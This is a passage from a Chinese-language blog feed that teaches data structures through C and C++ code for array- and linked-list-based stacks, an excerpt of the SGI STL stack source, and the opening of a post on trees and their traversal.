class="hljs-comment">  return;  </span><br><span class="hljs-comment">  &#125;  </span><br><span class="hljs-comment">  for (int i = copy-&gt;Top; i &gt;= 0; i--) &#123;  </span><br><span class="hljs-comment">  printf(&quot;%d &quot;, copy-&gt;Data[i]);  </span><br><span class="hljs-comment">  &#125;  </span><br><span class="hljs-comment">  printf(&quot;\n&quot;);  </span><br><span class="hljs-comment">  free(copy); // 释放复制栈的内存  </span><br><span class="hljs-comment">  &#125;  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>Stack S;<br>S = CreateStack();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;5入栈\n&quot;</span>);<br>Push(S,<span class="hljs-number">5</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;7入栈\n&quot;</span>);<br>Push(S,<span class="hljs-number">7</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;66入栈\n&quot;</span>);<br>Push(S,<span class="hljs-number">66</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;99入栈\n&quot;</span>);<br>Push(S,<span class="hljs-number">99</span>);<br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;100入栈\n&quot;</span>);<br>Push(S,<span class="hljs-number">100</span>);<br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;110入栈\n&quot;</span>);<br>Push(S,<span class="hljs-number">110</span>);<br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,Pop(S));<br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,Pop(S));<br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,Pop(S));<br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,Pop(S));<br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,Pop(S));<br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,Pop(S));<br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,Pop(S));<br>Print(S);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>思考：先入后出怎么被实现的？</strong><br><strong>思考：被注释掉的那个Print()能起到同样的作用吗，哪个更好？</strong></p>        </div>      </div>    </div><h2 id="链表实现"><a href="#链表实现" class="headerlink" title="链表实现"></a>链表实现</h2>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-9538668d" role="button" aria-expanded="false" aria-controls="collapse-9538668d">        <div class="fold-arrow">▶</div>栈的实现 链表      </div>      <div class="fold-collapse collapse" id="collapse-9538668d">        <div class="fold-content">          <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElementType;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SNode</span> *<span class="hljs-title">Stack</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SNode</span>&#123;</span><br>ElementType Data;<br>Stack Next;<br>&#125;;<br><br><br>Stack <span class="hljs-title function_">CreateStack</span><span class="hljs-params">()</span>;  <span class="hljs-comment">// 初始化链栈 </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">IsEmpty</span><span class="hljs-params">(Stack S)</span>;  <span class="hljs-comment">// 判断链栈是否为空 </span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Push</span><span class="hljs-params">(Stack S,ElementType item)</span>;  <span class="hljs-comment">// 入栈 </span><br>ElementType <span class="hljs-title function_">Pop</span><span class="hljs-params">(Stack S)</span>;  <span class="hljs-comment">// 出栈</span><br> <br><br><span class="hljs-comment">// 初始化 </span><br>Stack <span class="hljs-title function_">CreateStack</span><span class="hljs-params">()</span>&#123;<br>Stack S;<br>S = (Stack)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> SNode));<br>S-&gt;Next = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> S;<br>&#125;<br><br><span class="hljs-comment">// 判断是否为空 </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">IsEmpty</span><span class="hljs-params">(Stack S)</span>&#123;<br><span class="hljs-keyword">return</span> (S-&gt;Next == <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-comment">// 入栈</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Push</span><span class="hljs-params">(Stack S,ElementType item)</span>&#123;<br>Stack tmp;<br>tmp = (Stack)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> SNode));<br>tmp-&gt;Data = item;<br><span class="hljs-comment">// 链栈栈顶元素是链表头结点，新入栈的链表在栈顶元素后面 </span><br>tmp-&gt;Next = S-&gt;Next;   <br>S-&gt;Next = tmp;<br>&#125; <br><br><span class="hljs-comment">// 出栈</span><br>ElementType <span class="hljs-title function_">Pop</span><span class="hljs-params">(Stack S)</span>&#123;<br>Stack First;<br>ElementType TopVal;<br><span class="hljs-keyword">if</span>(IsEmpty(S))&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;堆栈空&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>First = S-&gt;Next;   <span class="hljs-comment">// 出栈第一个元素在栈顶元素后面 </span><br>S-&gt;Next = First-&gt;Next;  <span class="hljs-comment">//把第一个元素从链栈删除 </span><br>TopVal = First-&gt;Data;   <span class="hljs-comment">// 取出被删除结点的值 </span><br><span class="hljs-built_in">free</span>(First);  <span class="hljs-comment">// 释放空间 </span><br><span class="hljs-keyword">return</span> TopVal;<br>&#125;<br>&#125; <br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>Stack S;<br>S = CreateStack();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;5入栈\n&quot;</span>);<br>Push(S,<span class="hljs-number">5</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;7入栈\n&quot;</span>);<br>Push(S,<span class="hljs-number">7</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;66入栈\n&quot;</span>);<br>Push(S,<span class="hljs-number">66</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,Pop(S));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d出栈\n&quot;</span>,Pop(S));<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p><strong>思考：咦！这个链表的哑结点怎么不是头指针？</strong><br><strong>我们知道，链表是可以调整的，让s-&gt;Next一直指向栈顶元素，即可实现先入后出</strong><br><strong>不会就只能不断抄程序了。万一睡一觉起来就会了呢？</strong></p>        </div>      </div>    </div><h1 id="STL源码解析-stack"><a href="#STL源码解析-stack" class="headerlink" title="STL源码解析-stack"></a>STL源码解析-stack</h1>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-c60f2023" role="button" aria-expanded="false" aria-controls="collapse-c60f2023">        <div class="fold-arrow">▶</div>STD stack源码      </div>      <div class="fold-collapse collapse" id="collapse-c60f2023">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>, <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sequence</span> = deque&lt;T&gt; &gt;<br><span class="hljs-keyword">class</span> stack &#123;<br><span class="hljs-comment">//__STL_NULL_TMPL_ARGS是定义在 &lt;stl_config.h&gt;中，# define __STL_NULL_TMPL_ARGS &lt;&gt; </span><br>  <span class="hljs-keyword">friend</span> <span class="hljs-type">bool</span> <span class="hljs-keyword">operator</span>== __STL_NULL_TMPL_ARGS (<span class="hljs-type">const</span> stack&amp;, <span class="hljs-type">const</span> stack&amp;);<br>  <span class="hljs-keyword">friend</span> <span class="hljs-type">bool</span> <span class="hljs-keyword">operator</span>&lt; __STL_NULL_TMPL_ARGS (<span class="hljs-type">const</span> stack&amp;, <span class="hljs-type">const</span> stack&amp;);<br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> Sequence::value_type value_type;<br>  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> Sequence::size_type size_type;<br>  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> Sequence::reference reference;<br>  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> Sequence::const_reference const_reference;<br><span class="hljs-keyword">protected</span>:<br><span class="hljs-comment">// 底层容器</span><br>  Sequence c;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-comment">//stack下面的这些操作都是借助底层容器的操作来完成</span><br>  <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">empty</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> c.<span class="hljs-built_in">empty</span>(); &#125;<br>  <span class="hljs-function">size_type <span class="hljs-title">size</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> c.<span class="hljs-built_in">size</span>(); &#125;<br>  <span class="hljs-comment">//两个函数的区别：</span><br>  <span class="hljs-function">reference <span class="hljs-title">top</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> c.<span class="hljs-built_in">back</span>(); &#125; <span class="hljs-comment">//stack&lt;int&gt; a;a.top();会调用</span><br>  <span class="hljs-function">const_reference <span class="hljs-title">top</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> c.<span class="hljs-built_in">back</span>(); &#125;  <span class="hljs-comment">//const stack&lt;int&gt; a;a.top();会调用</span><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">const</span> value_type&amp; x)</span> </span>&#123; c.<span class="hljs-built_in">push_back</span>(x); &#125;<br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123; c.<span class="hljs-built_in">pop_back</span>(); &#125;<br>&#125;;<br><span class="hljs-comment">//stack的比较实际上就是底层容器的比较，会调用底层容器的重载操作符==、&lt;</span><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>, <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sequence</span>&gt;<br><span class="hljs-type">bool</span> <span class="hljs-keyword">operator</span>==(<span class="hljs-type">const</span> stack&lt;T, Sequence&gt;&amp; x, <span class="hljs-type">const</span> stack&lt;T, Sequence&gt;&amp; y) &#123;<br>  <span class="hljs-keyword">return</span> x.c == y.c;<br>&#125;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>, <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sequence</span>&gt;<br><span class="hljs-type">bool</span> <span class="hljs-keyword">operator</span>&lt;(<span class="hljs-type">const</span> stack&lt;T, Sequence&gt;&amp; x, <span class="hljs-type">const</span> stack&lt;T, Sequence&gt;&amp; y) &#123;<br>  <span class="hljs-keyword">return</span> x.c &lt; y.c;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>面向对象编程，通过模板类，友元函数，运算符重载等等实现</strong><br><strong>是不是很短？为什么这点代码就能实现？</strong><br><strong>把相应的已有的容器作为底部结构，将其接口改变，使之符合stack的特性，就形成一个stack</strong><br><em><strong>SGI STL stack默认底层容器是deque。</strong></em></p>        </div>      </div>    </div>]]></content>
    
    
    <categories>
      
      <category>Theory</category>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Datastructures-树(上)</title>
    <link href="/dong.github/2024/09/07/Datastructures-%E6%A0%91-%E4%B8%8A/"/>
    <url>/dong.github/2024/09/07/Datastructures-%E6%A0%91-%E4%B8%8A/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>后来才明白，为什么非要有树这种东西。</strong><br><strong>树的遍历，前序、中序、后序、层序，非递归，递归</strong></p><span id="more"></span><h1 id="引入：二分查找"><a href="#引入：二分查找" class="headerlink" title="引入：二分查找"></a><strong>引入：二分查找</strong></h1><p><img src="/dong.github/images/0907-3.png" alt="alt text"></p><blockquote><p><strong>“从这里面我们可以看到，由于我们在数组里面，对于我们要查找的元素，进行了有序化的一种组织，使得我们的查找过程是按照固定的顺序，或者说，是按照事先定义好的顺序来进行的。”</strong><br><strong>而这个顺序呢，是形成我们所说的类似树这样的一个结构</strong></p></blockquote><blockquote><p><strong>那反过来说，能不能把数据不一定放在数组？</strong><br><strong>我就按照这样的一个层次化的结构来存放数据，是不是也会达到二分查找一样的效果？”</strong></p></blockquote><p><strong>这就顺理成章地引入了树这种数据结构，用树的结构存储数据。</strong><br><strong>使得插入、查找、删除等等操作更加方便。</strong><br><strong>这样一来，动态查找问题也得到了解决！</strong></p><h1 id="树的定义"><a href="#树的定义" class="headerlink" title="树的定义"></a>树的定义</h1><p>……</p><h1 id="树的表示"><a href="#树的表示" class="headerlink" title="树的表示"></a>树的表示</h1><p><strong>Q:每个结点设计几个指针域呢？事先不知道它有几个子节点，那怎么办？</strong><br><strong>A:每个结点都留5个吧，这就能存下了，但是造成了大量的空间浪费。</strong><br><strong>A:儿子-兄弟表示法，只用两个指针域！</strong><br><img src="/dong.github/images/0907-4.png" alt="alt text"><br><img src="/dong.github/images/0907-5.png" alt="alt text"></p><p><strong>PS：儿子兄弟表示法如何实现呢？</strong></p><ul><li><strong>1.链式前向星，即数组模拟链表</strong></li><li><strong>2.邻接矩阵，用C++的二维向量实现</strong></li><li><strong>3.真链表</strong></li></ul>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-8f7bdefe" role="button" aria-expanded="false" aria-controls="collapse-8f7bdefe">        <div class="fold-arrow">▶</div>BT      </div>      <div class="fold-collapse collapse" id="collapse-8f7bdefe">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">TreeNode</span> *BinTree;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">TreeNode</span>&#123;<br><span class="hljs-type">int</span> Data;  <span class="hljs-comment">// 存值 </span><br>BinTree Left;    <span class="hljs-comment">// 左儿子结点 </span><br>BinTree Right;   <span class="hljs-comment">// 右儿子结点 </span><br>&#125;;<br><span class="hljs-function">BinTree <span class="hljs-title">CreatBinTree</span><span class="hljs-params">()</span></span>;   <span class="hljs-comment">// 创建一个二叉树</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(BinTree BT)</span></span>;  <span class="hljs-comment">// 判断树 BT 是否为空 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PreOrderTraversal</span><span class="hljs-params">(BinTree BT)</span></span>;   <span class="hljs-comment">// 先序遍历，根左右</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InOrderTraversal</span><span class="hljs-params">(BinTree BT)</span></span>;    <span class="hljs-comment">// 中序遍历，左根右 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PostOrderTraversal</span><span class="hljs-params">(BinTree BT)</span></span>;  <span class="hljs-comment">// 后序遍历，左右根 </span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">SNode</span> *Stack;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">SNode</span>&#123;<br>BinTree Data;<br>Stack Next;<br>&#125;;<br><br><br><span class="hljs-function">Stack <span class="hljs-title">CreateStack</span><span class="hljs-params">()</span></span>;  <span class="hljs-comment">// 初始化链栈 </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Stack S)</span></span>;  <span class="hljs-comment">// 判断链栈是否为空 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Push</span><span class="hljs-params">(Stack S,BinTree item)</span></span>;  <span class="hljs-comment">// 入栈 </span><br><span class="hljs-function">BinTree <span class="hljs-title">Pop</span><span class="hljs-params">(Stack S)</span></span>;  <span class="hljs-comment">// 出栈</span><br> <br><br><span class="hljs-comment">// 初始化 </span><br><span class="hljs-function">Stack <span class="hljs-title">CreateStack</span><span class="hljs-params">()</span></span>&#123;<br>Stack S;<br>S = (Stack)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> SNode));<br>S-&gt;Next = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> S;<br>&#125;<br><br><span class="hljs-comment">// 判断是否为空 </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Stack S)</span></span>&#123;<br><span class="hljs-keyword">return</span> (S-&gt;Next == <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-comment">// 入栈</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Push</span><span class="hljs-params">(Stack S,BinTree item)</span></span>&#123;<br>Stack tmp;<br>tmp = (Stack)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> SNode));<br>tmp-&gt;Data = item;<br><span class="hljs-comment">// 链栈栈顶元素是链表头结点，新入栈的链表在栈顶元素后面 </span><br>tmp-&gt;Next = S-&gt;Next;   <br>S-&gt;Next = tmp;<br>&#125; <br><br><span class="hljs-comment">// 出栈</span><br><span class="hljs-function">BinTree <span class="hljs-title">Pop</span><span class="hljs-params">(Stack S)</span></span>&#123;<br>Stack First;<br>BinTree TopVal;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">IsEmpty</span>(S))&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;堆栈空&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>First = S-&gt;Next;   <span class="hljs-comment">// 出栈第一个元素在栈顶元素后面 </span><br>S-&gt;Next = First-&gt;Next;  <span class="hljs-comment">//把第一个元素从链栈删除 </span><br>TopVal = First-&gt;Data;   <span class="hljs-comment">// 取出被删除结点的值 </span><br><span class="hljs-built_in">free</span>(First);  <span class="hljs-comment">// 释放空间 </span><br><span class="hljs-keyword">return</span> TopVal;<br>&#125;<br>&#125; <br><br><span class="hljs-function">BinTree <span class="hljs-title">Insert</span><span class="hljs-params">(<span class="hljs-type">int</span> Data)</span></span>&#123;<br>BinTree BT;<br>BT =  (BinTree)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> 